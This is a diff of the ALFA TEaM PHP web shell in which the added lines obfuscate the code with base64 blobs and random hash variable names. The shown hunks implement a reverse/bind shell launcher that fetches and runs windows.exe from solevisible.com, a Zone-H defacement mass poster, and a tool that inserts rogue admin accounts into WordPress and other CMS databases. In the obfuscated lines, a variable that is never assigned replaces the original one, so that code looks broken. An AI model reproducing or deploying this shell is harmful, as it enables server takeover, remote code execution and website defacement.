+$trgmvmvce1bfd762321e409cee4ac0b6e841963c="7VZta9swEP5e6H9QjaE2S5uXfhg0pDBYPw7KVtiHtjOOLNcitqVJ8pKxpb99d36L4zid17WwQV1wrbvTo0e6Oz1hSgnlKSaFMjy9d0bu9PBAM+MZnjAv5gk3hU3MPZ7ImFNuvDDOdOSg1Ta+umdGkxlhKxmLgDkWsQaktOchFL3js7O3OFj6MEizOMYBaw50BAMLUIAJub78+GG2Mkwl06tP49nxrX31+f3F8bR0g206nPN0CJNOuIXTE5z9QN7FoU+umZ8QHbE4Jg/k8AD9PCQOFVlqnIqyS2ZAyyU/Dg8IPLYEgNI3LU05I6saGRzBogFa1oTFmu1BnXSi6pvRXRO5No/vtpfw6SJfomAdZik1XKQeW3FttHMsaWpiLxRqcew2FuIBTN748vSgBzEK74yc4IYBxzjjtru0j5p2KTRfeVANmgeO2wFQUkTe1dlsGGHatVGQC08LuoCa0kx9Y8qxDJXnw+HoNP87t8gp0IeaYUqlovgP8yoiFURZkyKDw9YDclYztenOQj6lTGJcczcQYkQslsBAZ3MYOTKSXpb6CXPcARkBpptv0lrydLMPfMKl4oY5NgV2CdCFtNElHskpsS6sahF8lhGPGZ4oOQKk0Ici2UKqiyLE1ANic3J97orde4lvaORYQxrcEufmy62+e+MOOfYWnpVS7g5ujh1gGYB7U1VtdK69gCsHIgGCRtV3R7QtAGt7r62oTRsYxZPmEduyPEysFov8/En2RnzNIMIlc8jgooWP6AUNHxr7coWTkIi1k4TWxGbGRHNv60ZWaSw0a+WgMtalU2xxbzU059oB1ryvlP/dGZHZRflpSS4ZJM5SFtTZuMOxRMek27G1gFTY5EpQT0iWAstogKtiUXDZjMSUHEGmFdMiUxTYSqyY7d7Hp9Fe8xi6B0UAweCygp7oFTnuHTnpFUlbQWVPGZXt9lJ+QzIRYhaxyIrvgpXbXVO28uss5Tms9lBSbHdCzTFmFO4U5UPkEl8MXqheXS3MU6+xgvL3dCvHmwDggyKO6q42rOqtyorN21HrxwjU2+vDog5+nAp9EovJn7CY/D2Ljl7XXb3eeQEUp73PM97r2S6gvFcrb61p6+YPiEo9Ufa31TNEOSsaPSrvfZbia0v/nknb9LNr207uXrWtib9P2+AHa1910z3UrYeQ6VchexEh008SMv0kIdMvLmS65+Wt/ych0/+EkP2ORV8he2nN+gU=";
+$zetxriyy23eeeb4347bdd26bfc6b7ee9a3b755dd="pVRtT9swEP6cSv0PxptWR80M7YY0wYJUQZjQBlRtp30AVqXOpYmWOpHtQPnCb5/tJG1AHUKaqra+V99z95zf7e2XUuwvUr4P/B4VjyrJebeTropcKCTAk+WiEDkDKb1cevJRf3P2B5Sn0hV0O4WPcbeT2N8IYiQTyDLC3KNuxzFx/jaejvMCOGGe9fFnotTZVZSX6pnTxTgwahBilzrlL7WuvkmAKgVHRk2rlFRAGBG336h0upZqVSjiUuAsj4D0ShV//NLTeSoIIVNpzmsMaYxySXm4gj0fc4WNzol9RuM0A54Tc7ujPXRjFKwIhrVt3CyYXPprBWJ1PJ4O/N778a+zk95xbdWqY9tymaCPKfr6AfelEiR2+xidtIXhVjIXQSbBFvCQ6NuR6aAVHSUeq4MjdGkC2D0ZHAw/uzQCCxFbiNgW68CaQaFq/yKUstI2uR2DWWMjwj05qDXOwhdAJYSCJQSz6BaRm9+38q7vYk94cRYupXG4+HZ1PQlOR9PAreN0qkWTo+5lEaqEpjJKBVnQpcjLggxcd+NkmsmSF9bGqEcJPCL/mmDj18Ki8xl+WVYKt11JqVDII4tUnw3WOruRKkebB9XkOg+11HCkqeBoSz58y3FfF78ExR4Mz/CJ3omlr5lBQ7G810tV9XXp+v7Q7oe/vBncdTuQtSyf2hYn0YehddGVwDpVuhtm6VKuSKFP0q+2kVZ/pJZG5/OLq2BWryqdXp9+n09nk2B0aWI0TGUsebEJmF7/mBuvdsx8EvycBqOzs4lnLn1ZvaSawREh+IDaD/YKOwBJs1TvAieHRjLM1Csfur7uAjPEsyvT4qB5R6jMAAqLbTu8navXUIDgJzTK4hDNIFyhqZkvetIT2M2JLSFeC8ebp2F3ls3D8KwZdmAGJtLEzTkHpghJ6mbsxnn4Bpzy/3C+Fv5GnNL9Cw==";
+$pxmkwegbf83a0aa1f9ca0f7dd5994445ba7d9e80="lZLRjpNAFIav26TvMOJsC8kYWr1bpJFQ3DRrS8OwGmOVsPSsTKQDgVm3m+722Z0BVifGGL0755/Dd+Abnj+zb5vavmbcBv4dVVAXo+FtA2gZnp/TMvsGwhkNcdm4+EuoqiZ3DThUZS1QHEQr9yCg3jsbOnMnW7z5sNjOJ05/LkOnJTc5esEM+TS7MRXqtLfvZMysY4s788MV3QT+GbIvDedRLhHuVxBVXYry+p6nezAnIqsmliQ07SuZlIw3b5PlOojJmIb+ZULjKPBWBAvr4WHHwLS6bW+86OK9686s42g4wJWLVf9p+lmeDhoQilZWCkfDd4kCSSANkyi4ooG3WERkpkAD+RE7OaTG092uThg3cUWWazWSeOuPlrZ1ULBGAJfjr/Q0zTKQm3xCrW65JPrEOCGvuElRDOke0RyKAp223CDTdqisgCMaL5ZrYrwe+4bzFIRXMTHmehJEUZ/I5+AAGZJqtfVZUTZg+pbTFfRnoehaI8laJ6lWB2QCTWUlLweK5pfYl38Si/O+nXUtcxkHkaSilNpyXQpO3d+cYqafZyXnkKn7wamet/boP9gze3vzMTUs5ynp9elR709FfxP4f946W3BU+kz5Jz3+AA==";
+$exelepbo58e53d1324eef6265fdb97b08ed9aadf="tVb7b9M6FP7Z+SuMN0hzVxLGQ+h2N6vGU0ggqjG4QmQXtc5pYy11gu3QoW387fiVrqXt1ivd66p1es7n8/T52p07SSNFMmI8Af4di2b0I9jBhVK17CXJhKmiGcW0miajR08fn7nPQMC3hgnAoazoGajwWlAPVcGHUwiDIIcxlg09kwESoBrB8fHHZ5+/Dt4enbx6f/wuzqsZp0MJ8XSoaNEJp3LG+KV5TxmfzMKor0QDvfGwlBAAz51FAcPSOOlIJSJtOdV7gNgYv2IlxHDOpJJ9r9TagY8n5jCz0rg1EKvqqw7NGDbHbaRYFcCxSEU8kc2ok2RJ0iVZRiJsYT4N4aLRh46OX3+KS+ATVaTpfoD1MqIvD07Tn8k/Xx7c//P0Yr/75Go36dfpG65gAqLjEVFPB6vsGZmePB98APEdhI2TkG4dWQ1NZTykFGoHpHEtGFeY2DZgWUBZ4h6mFedAFeQZJxY3ggnj9sksHSivlO8FXljjlJoqsCUhnAPF0voZdwic15VQ+OTl8bv0XIGYHgw+7Kdhtjv4+0V2GB54vRYe2DskC3yf4eyv7N7dHGeHdnvodtIdm1c09wamsYuu2/TmPSYxifbIIVlCzQrdaVzq2CeglhMySwyZBAxCVOKZqEzypWlGziAT/d1kBe+rU8a0qKZ1mhKyAvEwY4fmOP4jYWshZpVp6e+ORiasG4aRM7zxRHt1cz0/VFXiR79TRhvRzse8QLcgXzChvWvLNwHNZd6k264jCw31ZcpmvRvLtC5pV6etE7oN/p+mBRtNvXkf11UNvFN2iSDRxSWrLlvzrDJsk+8RPZd7K76ugm3D/l22+L19FiBpc33vNfnN6QW4bMR1BjKmZbWQkUw5K4PWluvhErE9tAS5gdi0o1VqO9DSIrXf9k81x5oC+oAc4TrGsz8ejvF2Loory3pIbsFxyBEcQkvUhhAaa760jIaMu/+byFCb2Tzo1QullS1hSUdYWoJuISkbP1rDTMjLF6nIytBm4kHtoTU0g9rDi4zihUvk4US2d3bdmLCty29MsDmKdpBX3S5r/o1z8Mh10ym3nM4lp353m/8zsHbgkJ82E6WbM/1kJwz58XKTZ8FG8gs=";
+$hupyxoxz36c4536996ca5615dcf9911f068786dc="nVHLasMwEDwrkH8QvliCoEDTW8ih9BPSW/pAtdeRQJZcSXYKIfn2yrKd5tGWYh+Ed2d2NDtquMWu4juNV9jCRy0tkDQTUuVvlTUZOJdSFgnL6aQJZA3+nBrKlPaQ8xZ4eY52nRMhM9oZBRdXda1I6VUEKBUo6fxd6rkTaUBkQXo3rFLcF8aWrOQ+E2T+ugssSen3XFbmDD4hPSlyu20CMCi0ZafZ/jEFeuvFarWg++kEtXwRyGEvlgXzHtZgG7CkqHXmpdHERR5ybGelB5Ic8YMqOH5qV19HD8dnnbT74P7rtgqiMUcSjZ7jTjDnc6mZBVeXQOg1ZGrPws1Jzj1PZoMTTNqa7gcnsVoebpXB2pHjf40Npm+mUXcKpqTzoGPKm7uXtnmYTkA5wNfZ35+ydxfZPxqtoYu9V5nF19wsotx/HgH9lj76IXY0Mm80Mmg0LuHDFw==";
+$yyphbkaj4a8a08f09d37b73795649038408b5f33="tVJtb9owEP7cSv0PHp1ap/WAsO0TTaWoZBLaChHJNE0bilLHNKcZG8Vmgk7rb98lBArZi/alUqzcPff47nzPnYLicpkJcmVsBrqdX58cn+5hBaj738BMwl0TXJuOXS+E+QNuNP8mbCOghAU8HVCNwFIBVqhAUJbMU1C0NNLinjOepwW5QPP7l6nz4+T4qIwYxpn23D662PCSI4IV0ywrElAEShxmtLzveb3q1hG0Dahkls5Brj3/XTIcBXH/KbDQhfVyq5WhqdVAq4Lu1HH2OGX+tql+FVXS4cgfDCaJP/q84Rlv83JaF2DR+OZ9EsWTwL9l3ZojbEnSC0sNxj8kJaeiJpPgYxSUGdmZZgYehJ5RvW1hRl8YR6zA0jrRHagMU9DGBMiFcwasu3JrmsThCoXEtxufeynnoqrefeoJU3HWeiS+nKUkFumcRLmQkjx+VS3We7MlZstFD4mHnnvg9eqUayw7py2xKkdL4mBy662sKOb9MHK985fhp8H1eb+OIoSm4KSDj+qYnLyCVt2t1EZQXjk/8QhpBNlp+/pZtC23tLI2zN60nveDKPQWYjh1iWPdMi7dy31kl/2fGzEMw8k4HifxTbgTmXKtlOD2r8rWe9GIOY5z1T1Yj0pT87+amobnHnjPoanZaorfLw==";
+$wcfvvmhi93f725a07423fe1c889f448b33d21f46="lVRNb9swDD2nQP+D4JM9BG6T04bCwz6ww4ABHZbeuhwUhbG12rIg0XGCNPvtoz7sumsvPdiWyCfy8ZGybHRrkP3he57LNn93c3khJyYF6G2XF7rb1FIwUXNrGa93/A54c7q8mGkj9xyBWeRIgJ1UvI4wjQwOCGpr2V1lgG8dfjzwXekOV0j2hkl7M3Xddvjkazv0DMgdOGhMn5+dvziQnbCSNpe2oMh+ScbCRTqHUJ9u92CM3MIk7r6VW2Y6lWae5wzNMSxmmyPC/ZptWMEU9Mxv3y8+LNc3wS8VMkFOyuPKTDdZdPSVrCEVH4vrjMVYM2KR90YipJv59VwMUG/f1Z2t0tH0asyz/4S34Ciq9NtBgEbZKgbZCXJSUZEWXDzcGS6Awnmwe4XqY72xY77shkuVkn5SlVQoN6UNIrjK3Dj43MHPRLMlXsnVRqorWyXeJXfp6mgRmrwE/GlaDQaPadLaXPEGkizH9kfbg/nKLRHKpdrC4XaXJr1USebkOcWo9EkC35itd9a/7DONHHMzx1YV1DX7+1uFzJPe9C75F9rbKOGqFQ+ArIp9C9voG7tL1F29eQ2qxKooFrH9M38NCppThBJMrrmxQBuPvr9eD/1YgaFZiqnskGpiTF2gAe242JwL17Gh0aGXUFtg/5NZvpVMEE1qwnrXYj1JPBFB6jmb8Dq/LgV7fGSv85newFK6siun/sQ8jvGzy1m2I3ZqH8HkH27HYKJxEuB+J3TwV6dQNuCOxyVNExxApDQ4WfxPkFo0tYtYMOmsX1CbOyJDAodePqFL90fRLxmO8EVOV8e49unluHyS0b/ecDPpOf8D";
 echo "<div class=header><center><br><div class='txtfont_header'>| Back Connect |</div><br><br>";
 echo "<form onSubmit=\"g('connect',null,this.selectCb.value,this.server.value,this.port.value,this.cbmethod.value);return false;\">
 <div class=\"txtfont\">Mehtod:</div> <select name='cbmethod' onChange='ctlbc(this);' style='width:120px;'><option value='back'>Reverse Shell</option><option value='bind'>Bind Port</option></select> <div class=\"txtfont\">Use:</div> <select name='selectCb'>";
-$cbArr = array("php"=>"Php","perl"=>"Perl","python"=>"Python","ruby"=>"Ruby","c"=>"C","java"=>"Java","node"=>"NodeJs","bcwin"=>"Windows");
-foreach($cbArr as $key=>$val){echo("<option value='{$key}' ".($GLOBALS['sys']=='win'?'selected':'').">{$val}</option>");}
+$lbpnyhzh763d8fdadcdd9153dea0f47649283e55 = array("php"=>"Php","perl"=>"Perl","python"=>"Python","ruby"=>"Ruby","c"=>"C","java"=>"Java","node"=>"NodeJs","bcwin"=>"Windows");
+foreach($lbpnyhzh763d8fdadcdd9153dea0f47649283e55 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf){echo("<option value='{$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d}' ".($GLOBALS['sys']=='win'?'selected':'').">{$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf}</option>");}
 echo "</select> <div id='bcipAction' style='display:inline-block;'><div class=\"txtfont\">IP:</div> <input type='text' style='text-align:center;' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'></div> <div class=\"txtfont\">Port: </div> <input type='text' size='5' style='text-align:center;' name='port' value='2012'> <input type='submit' value=' '></form><p><div id='bcStatus'><small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small></div></p></center></b></font><br>";
 if(isset($_POST['alfa1'])&&!empty($_POST['alfa1'])){
-$lang = $_POST['alfa1'];
-$ip = $_POST['alfa2'];
-$port = $_POST['alfa3'];
-$arg = ($_POST['alfa4']=='bind'?$port:$port.' '.$ip);
-$tmpdir = ALFA_TEMPDIR;
-$name = $tmpdir.'/'.$lang.uniqid().rand(1,99999);
-$allow = array('perl','ruby','python','node');
-eval('$lan=$'.$lang.';');
-if(in_array($lang,$allow)){
-if(__write_file($name,__get_resource($lan))){
+$phbpyamz7572559ca86e781ba8fe8073a0b725c6 = $_POST['alfa1'];
+$jywhuplv957b527bcfbad2e80f58d20683931435 = $_POST['alfa2'];
+$fbwqabyz901555fb06e346cb065ceb9808dcfc25 = $_POST['alfa3'];
+$mcpievhm61dd86c2dc75c3f569ec619bd283a33f = ($_POST['alfa4']=='bind'?$fbwqabyz901555fb06e346cb065ceb9808dcfc25:$fbwqabyz901555fb06e346cb065ceb9808dcfc25.' '.$jywhuplv957b527bcfbad2e80f58d20683931435);
+$qofyaewi3f70a5cb5712430a7869904d10f14c87 = ALFA_TEMPDIR;
+$kkkpgnftb068931cc450442b63f5b3d276ea4297 = $qofyaewi3f70a5cb5712430a7869904d10f14c87.'/'.$phbpyamz7572559ca86e781ba8fe8073a0b725c6.uniqid().rand(1,99999);
+$anwigqkkb394126a0e52e75f1e3d535d0fb0d33c = array('perl','ruby','python','node');
+eval('$lan=$'.$phbpyamz7572559ca86e781ba8fe8073a0b725c6.';');
+if(in_array($phbpyamz7572559ca86e781ba8fe8073a0b725c6,$anwigqkkb394126a0e52e75f1e3d535d0fb0d33c)){
+if(__write_file($kkkpgnftb068931cc450442b63f5b3d276ea4297,__get_resource($gsbfkwqy73f50c9f17291ce93ee52e50b73f6f63))){
 if(_alfa_can_runCommand(true,true)){
-$os = ($GLOBALS['sys']!='win')?'1>/dev/null 2>&1 &':'';
-$out = alfaEx("$lang $name $arg $os");
-if($out==''){$out="<font color='green'><center>[ Finished...! ]</center></font>";}
-echo("<pre class='ml1' style='margin-top:5px'>{$out}</pre>");
+$vyggorindd302f94682dbd2a114d63b0433602e0 = ($GLOBALS['sys']!='win')?'1>/dev/null 2>&1 &':'';
+$vemvtkqkc68271a63ddbc431c307beb7d2918275 = alfaEx("$phbpyamz7572559ca86e781ba8fe8073a0b725c6 $kkkpgnftb068931cc450442b63f5b3d276ea4297 $mcpievhm61dd86c2dc75c3f569ec619bd283a33f $vyggorindd302f94682dbd2a114d63b0433602e0");
+if($vemvtkqkc68271a63ddbc431c307beb7d2918275==''){$vemvtkqkc68271a63ddbc431c307beb7d2918275="<font color='green'><center>[ Finished...! ]</center></font>";}
+echo("<pre class='ml1' style='margin-top:5px'>{$vemvtkqkc68271a63ddbc431c307beb7d2918275}</pre>");
 }
 }else{
 echo("<pre class=ml1 style='margin-top:5px'><font color='red'><center>[ Failed...! ]</center></font></pre>");
 }
 }
-if($lang=='java'||$lang=='c'){
-$code = __get_resource($lan);
-$out = nl2br(bcinit($lang, $code,'',''));
-echo("<pre class=ml1 style='margin-top:5px'><center>{$out}</center></pre>");
+if($phbpyamz7572559ca86e781ba8fe8073a0b725c6=='java'||$phbpyamz7572559ca86e781ba8fe8073a0b725c6=='c'){
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = __get_resource($gsbfkwqy73f50c9f17291ce93ee52e50b73f6f63);
+$vemvtkqkc68271a63ddbc431c307beb7d2918275 = nl2br(bcinit($phbpyamz7572559ca86e781ba8fe8073a0b725c6, $nndigmblc13367945d5d4c91047b3b50234aa7ab,'',''));
+echo("<pre class=ml1 style='margin-top:5px'><center>{$vemvtkqkc68271a63ddbc431c307beb7d2918275}</center></pre>");
 }
-if($lang=='bcwin'){
-$alfa = new AlfaCURL();
-$s = $alfa->Send('http://solevisible.com/bc/windows.exe');
-$tmpdir = ALFA_TEMPDIR;
-$f = @fopen($tmpdir.'/bcwin.exe','w+');
-@fwrite($f, $s);
-@fclose($f);
-$out = alfaEx($tmpdir."/bcwin.exe ".$_POST['alfa2']." ".$_POST['alfa3']);
+if($phbpyamz7572559ca86e781ba8fe8073a0b725c6=='bcwin'){
+$rpatbarj56aed7e7485ff03d5605b885b86e947e = new AlfaCURL();
+$fwekvgvg03c7c0ace395d80182db07ae2c30f034 = $rpatbarj56aed7e7485ff03d5605b885b86e947e->Send('http://solevisible.com/bc/windows.exe');
+$qofyaewi3f70a5cb5712430a7869904d10f14c87 = ALFA_TEMPDIR;
+$npviloqa8fa14cdd754f91cc6554c9e71929cce7 = @fopen($qofyaewi3f70a5cb5712430a7869904d10f14c87.'/bcwin.exe','w+');
+@fwrite($npviloqa8fa14cdd754f91cc6554c9e71929cce7, $fwekvgvg03c7c0ace395d80182db07ae2c30f034);
+@fclose($npviloqa8fa14cdd754f91cc6554c9e71929cce7);
+$vemvtkqkc68271a63ddbc431c307beb7d2918275 = alfaEx($qofyaewi3f70a5cb5712430a7869904d10f14c87."/bcwin.exe ".$_POST['alfa2']." ".$_POST['alfa3']);
 }
-if($lang=='php'){
+if($phbpyamz7572559ca86e781ba8fe8073a0b725c6=='php'){
 echo "<pre class=ml1 style='margin-top:5px'>";
-$code = __get_resource($lan);
-if($code!==false){
-$code = "\$target = \"".$arg."\";\n".$code;
-eval($code);
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = __get_resource($gsbfkwqy73f50c9f17291ce93ee52e50b73f6f63);
+if($nndigmblc13367945d5d4c91047b3b50234aa7ab!==false){
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = "\$target = \"".$mcpievhm61dd86c2dc75c3f569ec619bd283a33f."\";\n".$nndigmblc13367945d5d4c91047b3b50234aa7ab;
+eval($nndigmblc13367945d5d4c91047b3b50234aa7ab);
 echo("<center><font color='green'>[ Finished...! ]</font></center>");
 }
 echo "</pre>";
@@ -3830,47 +3903,47 @@ echo '<div class=header>';
 if(!function_exists('curl_version')){
 echo "<pre class=ml1 style='margin-top:5px'><center><font color=red><b><big><big>PHP CURL NOT EXIST ~ ZONE H MASS POSTER DOES NOT WORK</b></font></big></big></center></pre>";
 }
-$hackmode = array('known vulnerability (i.e. unpatched system)','undisclosed (new) vulnerability','configuration / admin. mistake','brute force attack','social engineering','Web Server intrusion','Web Server external module intrusion','Mail Server intrusion','FTP Server intrusion','SSH Server intrusion','Telnet Server intrusion','RPC Server intrusion','Shares misconfiguration','Other Server intrusion','SQL Injection','URL Poisoning','File Inclusion','Other Web Application bug','Remote administrative panel access bruteforcing','Remote administrative panel access password guessing','Remote administrative panel access social engineering','Attack against administrator(password stealing/sniffing)','Access credentials through Man In the Middle attack','Remote service password guessing','Remote service password bruteforce','Rerouting after attacking the Firewall','Rerouting after attacking the Router','DNS attack through social engineering','DNS attack through cache poisoning','Not available','Cross-Site Scripting');
-$reason = array('Heh...just for fun!','Revenge against that website','Political reasons','As a challenge','I just want to be the best defacer','Patriotism','Not available');
+$ajlrrcol15c454a15fd2f01687de2e56b824a6fe = array('known vulnerability (i.e. unpatched system)','undisclosed (new) vulnerability','configuration / admin. mistake','brute force attack','social engineering','Web Server intrusion','Web Server external module intrusion','Mail Server intrusion','FTP Server intrusion','SSH Server intrusion','Telnet Server intrusion','RPC Server intrusion','Shares misconfiguration','Other Server intrusion','SQL Injection','URL Poisoning','File Inclusion','Other Web Application bug','Remote administrative panel access bruteforcing','Remote administrative panel access password guessing','Remote administrative panel access social engineering','Attack against administrator(password stealing/sniffing)','Access credentials through Man In the Middle attack','Remote service password guessing','Remote service password bruteforce','Rerouting after attacking the Firewall','Rerouting after attacking the Router','DNS attack through social engineering','DNS attack through cache poisoning','Not available','Cross-Site Scripting');
+$hwghecau40bea8d637cdf2c1b07fcf0630482b73 = array('Heh...just for fun!','Revenge against that website','Political reasons','As a challenge','I just want to be the best defacer','Patriotism','Not available');
 echo '
 <center><br><div class="txtfont_header">| Zone-h Mass Poster |</div><center><br>
 <form action="" method="post" onsubmit="g(\'zoneh\',null,this.defacer.value,this.hackmode.value,this.reason.value,this.domain.value,\'>>\'); return false;">
 <input type="text" name="defacer" size="67" id="text" placeholder="ALFA TEaM 2012" />
 <br>
 <select id="text" name="hackmode" style="width:400px;">';
-$x=1;
-foreach($hackmode as $mode){echo('<option style="background-color: rgb(F, F, F);" value="'.$x.'">'.$mode.'</option>');$x++;}
+$fyyftmba9dd4e461268c8034f5c8564e155c67a6=1;
+foreach($ajlrrcol15c454a15fd2f01687de2e56b824a6fe as $porcbkyw15d61712450a686a7f365adf4fef581f){echo('<option style="background-color: rgb(F, F, F);" value="'.$fyyftmba9dd4e461268c8034f5c8564e155c67a6.'">'.$porcbkyw15d61712450a686a7f365adf4fef581f.'</option>');$fyyftmba9dd4e461268c8034f5c8564e155c67a6++;}
 echo '</select><br><select id="text" name="reason" style="width:200px;">';
-$x=1;
-foreach($reason as $mode){echo('<option style="background-color: rgb(F, F, F);" value="'.$x.'">'.$mode.'</option>');$x++;}
+$fyyftmba9dd4e461268c8034f5c8564e155c67a6=1;
+foreach($hwghecau40bea8d637cdf2c1b07fcf0630482b73 as $porcbkyw15d61712450a686a7f365adf4fef581f){echo('<option style="background-color: rgb(F, F, F);" value="'.$fyyftmba9dd4e461268c8034f5c8564e155c67a6.'">'.$porcbkyw15d61712450a686a7f365adf4fef581f.'</option>');$fyyftmba9dd4e461268c8034f5c8564e155c67a6++;}
 echo '</select><br>
 <textarea name="domain" cols="90" rows="20" placeholder="Domains..."></textarea><br>
 <p><input type="submit" value=" " name="go" /></p>
 </form></center>';
 if($_POST['alfa5'] && $_POST['alfa5'] == '>>'){
 ob_start();
-$hacker = $_POST['alfa1'];
-$method = $_POST['alfa2'];
-$neden = $_POST['alfa3'];
-$site = $_POST['alfa4'];
-if(empty($hacker)){
+$tnzvgqtvd6a6bc0db10694a2d90e3a69648f3a03 = $_POST['alfa1'];
+$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce = $_POST['alfa2'];
+$letbcgpfe92d7ff86f8dc5f743fb4c025e68e5aa = $_POST['alfa3'];
+$svjurwzc98defd6ee70dfb1dea416cecdf391f58 = $_POST['alfa4'];
+if(empty($tnzvgqtvd6a6bc0db10694a2d90e3a69648f3a03)){
 die (__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST FILL THE ATTACKER NAME [+]</font></b></center>");
-}elseif($method == "------------------------------------SELECT-------------------------------------"){
+}elseif($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce == "------------------------------------SELECT-------------------------------------"){
 die(__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST SELECT THE METHOD [+]</b></font></center>");
-}elseif($neden == "------------------------------------SELECT-------------------------------------"){
+}elseif($letbcgpfe92d7ff86f8dc5f743fb4c025e68e5aa == "------------------------------------SELECT-------------------------------------"){
 die(__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST SELECT THE REASON [+]</b></font></center>");
-}elseif(empty($site)){
+}elseif(empty($svjurwzc98defd6ee70dfb1dea416cecdf391f58)){
 die(__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST INTER THE SITES LIST [+]<font></b></center>");
 }
-$i = 0;
-$sites = explode("\n", $site);
-$alfa = new AlfaCURL();
-while($i < count($sites)){
-if(substr($sites[$i], 0, 4) != "http"){
-$sites[$i] = "http://".$sites[$i];
+$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 0;
+$vrmbgrekd27edbd18c3bdf9ce1d013c6626ba26c = explode("\n", $svjurwzc98defd6ee70dfb1dea416cecdf391f58);
+$rpatbarj56aed7e7485ff03d5605b885b86e947e = new AlfaCURL();
+while($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 < count($vrmbgrekd27edbd18c3bdf9ce1d013c6626ba26c)){
+if(substr($vrmbgrekd27edbd18c3bdf9ce1d013c6626ba26c[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741], 0, 4) != "http"){
+$vrmbgrekd27edbd18c3bdf9ce1d013c6626ba26c[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741] = "http://".$vrmbgrekd27edbd18c3bdf9ce1d013c6626ba26c[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741];
 }
-$alfa->Send("http://www.zone-h.com/notify/single","post","defacer=".$hacker."&domain1=". $sites[$i]."&hackmode=".$method."&reason=".$neden);
-++$i;
+$rpatbarj56aed7e7485ff03d5605b885b86e947e->Send("http://www.zone-h.com/notify/single","post","defacer=".$tnzvgqtvd6a6bc0db10694a2d90e3a69648f3a03."&domain1=". $vrmbgrekd27edbd18c3bdf9ce1d013c6626ba26c[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]."&hackmode=".$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce."&reason=".$letbcgpfe92d7ff86f8dc5f743fb4c025e68e5aa);
+++$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741;
 }
 echo __pre()."<center><font color =\"#00A220\"><b>[+] Sending Sites To Zone-H Has Been Completed Successfully !!![+]</b><font></center>";
 }
@@ -3882,14 +3955,14 @@ alfahead();
 
 echo '<div class=header><center><br><div class="txtfont_header">| Add New Admin |</div>
 <center><h3>';
-$vals = array('WordPress' => array('wp',2),'Joomla' => array('joomla',3),'vBulletin' => array('vb',5),'phpBB' => array('phpbb',6),'WHMCS' => array('whmcs',7),'MyBB' => array('mybb',8),'Php Nuke' => array('nuke',9),'Drupal' => array('drupal',10),'SMF' => array('smf',11));
-Alfa_Create_A_Tag('pwchanger',$vals);
+$zedzftuyb2021c4149dfd5dc85c88823b7df34bd = array('WordPress' => array('wp',2),'Joomla' => array('joomla',3),'vBulletin' => array('vb',5),'phpBB' => array('phpbb',6),'WHMCS' => array('whmcs',7),'MyBB' => array('mybb',8),'Php Nuke' => array('nuke',9),'Drupal' => array('drupal',10),'SMF' => array('smf',11));
+Alfa_Create_A_Tag('pwchanger',$zedzftuyb2021c4149dfd5dc85c88823b7df34bd);
 echo '</h3></center>';
 if(isset($_POST['alfa1'])&&$_POST['alfa1']=='wp'){
 
 echo __pre().'<center><center><div class="txtfont_header">| WordPress |</div>
 <p>'.getConfigHtml('wp').'</p><form onSubmit="g(\'pwchanger\',null,\'wp\',\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,this.email.value,this.prefix.value);return false;" method="POST">';
-$table = array('td1' =>
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Mysql Host','id'=>'db_host', 'inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
@@ -3906,33 +3979,33 @@ $table = array('td1' =>
  'td8' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
 );
-create_table($table);
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
 echo '<p><input value=" " name="send" type="submit"></p></form>';
 if ($_POST['alfa2'] && $_POST['alfa2'] == '>>'){
-$localhost = $_POST['alfa3'];
-$database = $_POST['alfa4'];
-$username = $_POST['alfa5'];
-$password = $_POST['alfa6'];
-$admin = $_POST['alfa8'];
-$SQL = $_POST['alfa9'];
-$prefix = $_POST['alfa10'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"insert into ".$prefix."users (ID,user_login,user_pass,user_email) values(null,'$admin','d4a590caacc0be55ef286e40a945ea45','$SQL')") or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"select ID from ".$prefix."users where user_login='".$admin."'") or die(mysqli_error($conn));
-$sole = @mysqli_num_rows($solevisible);
-if ($sole == 1){
-$solevis = @mysqli_fetch_assoc($solevisible);
-$res = $solevis['ID'];
+$wvrappnp421aa90e079fa326b6494f812ad13e79 = $_POST['alfa3'];
+$tcmsiznr11e0eed8d3696c0a632f822df385ab3c = $_POST['alfa4'];
+$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa5'];
+$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = $_POST['alfa6'];
+$qmgjkvzo21232f297a57a5a743894a0e4a801fc3 = $_POST['alfa8'];
+$vdhryjes9778840a0100cb30c982876741b0b5a2 = $_POST['alfa9'];
+$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $_POST['alfa10'];
